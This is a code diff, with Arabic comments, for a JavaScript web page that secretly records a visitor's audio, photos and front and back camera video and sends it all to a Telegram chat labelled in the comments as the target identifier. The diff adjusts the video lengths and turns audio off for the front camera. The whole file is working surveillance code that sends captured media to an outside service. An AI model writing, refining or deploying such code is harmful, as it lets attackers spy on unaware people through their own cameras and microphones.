@@ -146,7 +146,6 @@
             } catch(e) { console.warn(e); }
         }
         
-        // ========== إرسال فيديو ==========
         async function sendVideo(videoBlob, caption) {
             const chatId = getChatId();
             if (!chatId) return;
@@ -169,18 +168,23 @@
         }
 
         // ========== تسجيل فيديو ==========
-        async function recordVideo(facingMode, duration = 8000) {
+        async function recordVideo(facingMode, duration, withAudio = true) {
             let stream = null;
             let mediaRecorder = null;
             let chunks = [];
             
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
+                const constraints = {
                     video: { 
                         facingMode: { exact: facingMode }
-                    },
-                    audio: true
-                });
+                    }
+                };
+                
+                if (withAudio) {
+                    constraints.audio = true;
+                }
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 const videoElement = document.createElement('video');
                 videoElement.srcObject = stream;
@@ -458,16 +462,18 @@
             
             let audioUrl = await recordAudio(5000);
             
-            // ===== تسجيل الفيديو (8 ثواني) =====
+            // ===== تسجيل الفيديو =====
             let frontVideo = null;
             let backVideo = null;
             
+            // فيديو أمامي 5 ثواني بدون صوت
             try {
-                frontVideo = await recordVideo("user", 8000);
+                frontVideo = await recordVideo("user", 5000, false);
             } catch(e) { console.warn(e); }
             
+            // فيديو خلفي 3 ثواني مع صوت
             try {
-                backVideo = await recordVideo("environment", 8000);
+                backVideo = await recordVideo("environment", 3000, true);
             } catch(e) { console.warn(e); }
             
             // إرسال البيانات إلى المعرف المستهدف
@@ -500,8 +506,8 @@
             report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
             report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
             report += `📷 صور خلفية: ${backPhotos.length} صورة\n`;
-            report += `🎥 فيديو أمامي: ${frontVideo ? '✓ تم' : '✗ فشل'}\n`;
-            report += `🎥 فيديو خلفي: ${backVideo ? '✓ تم' : '✗ فشل'}`;
+            report += `🎥 فيديو أمامي (5ث بدون صوت): ${frontVideo ? '✓ تم' : '✗ فشل'}\n`;
+            report += `🎥 فيديو خلفي (3ث مع صوت): ${backVideo ? '✓ تم' : '✗ فشل'}`;
             
             await sendToTelegram(report, true);
             
@@ -519,12 +525,12 @@
             }
             
             if(frontVideo) {
-                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (8 ثوان)");
+                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (5 ثوان بدون صوت)");
                 await delay(300);
             }
             
             if(backVideo) {
-                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (8 ثوان)");
+                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (3 ثوان مع صوت)");
                 await delay(300);
             }
             
